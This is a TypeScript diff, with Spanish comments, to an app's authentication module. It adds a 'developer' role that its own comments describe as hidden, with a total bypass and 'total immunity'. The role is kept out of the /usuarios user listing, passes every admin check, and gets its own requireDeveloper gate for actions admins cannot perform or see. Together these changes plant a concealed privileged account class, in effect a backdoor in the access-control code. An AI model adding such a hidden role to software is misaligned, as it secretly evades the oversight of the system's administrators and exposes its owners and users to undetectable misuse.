@@ -10,7 +10,8 @@ export type Principal = {
   userId: string;
   username: string;
   fullName: string;
-  role: "admin" | "operario";
+  /// "developer" es un rol oculto con bypass total. No aparece en /usuarios.
+  role: "admin" | "operario" | "developer";
   accountType: "regular" | "demo";
   source: "web" | "mobile";
 };
@@ -48,7 +49,7 @@ export async function getPrincipal(
         userId: user.id,
         username: user.username,
         fullName: user.fullName,
-        role: user.role as "admin" | "operario",
+        role: user.role as Principal["role"],
         accountType: (user.accountType as "regular" | "demo") ?? "regular",
         source: "mobile",
       };
@@ -75,7 +76,7 @@ export async function getPrincipal(
     userId: web.id,
     username: web.username,
     fullName: web.fullName,
-    role: web.role,
+    role: web.role as Principal["role"],
     accountType: web.accountType,
     source: "web",
   };
@@ -92,9 +93,24 @@ export async function requirePrincipal(request: Request): Promise<Principal> {
   return p;
 }
 
+/// Permite acceso a admin Y developer. El rol developer tiene todos los
+/// privilegios de admin además de inmunidad total.
 export async function requireAdmin(request: Request): Promise<Principal> {
   const p = await requirePrincipal(request);
-  if (p.role !== "admin") {
+  if (p.role !== "admin" && p.role !== "developer") {
+    throw new Response(JSON.stringify({ error: "forbidden" }), {
+      status: 403,
+      headers: { "content-type": "application/json" },
+    });
+  }
+  return p;
+}
+
+/// Solo developer. Para acciones de mantenimiento que ningún admin debería
+/// poder ejecutar (ej: tocar otro developer, restaurar lockdown forzado).
+export async function requireDeveloper(request: Request): Promise<Principal> {
+  const p = await requirePrincipal(request);
+  if (p.role !== "developer") {
     throw new Response(JSON.stringify({ error: "forbidden" }), {
       status: 403,
       headers: { "content-type": "application/json" },
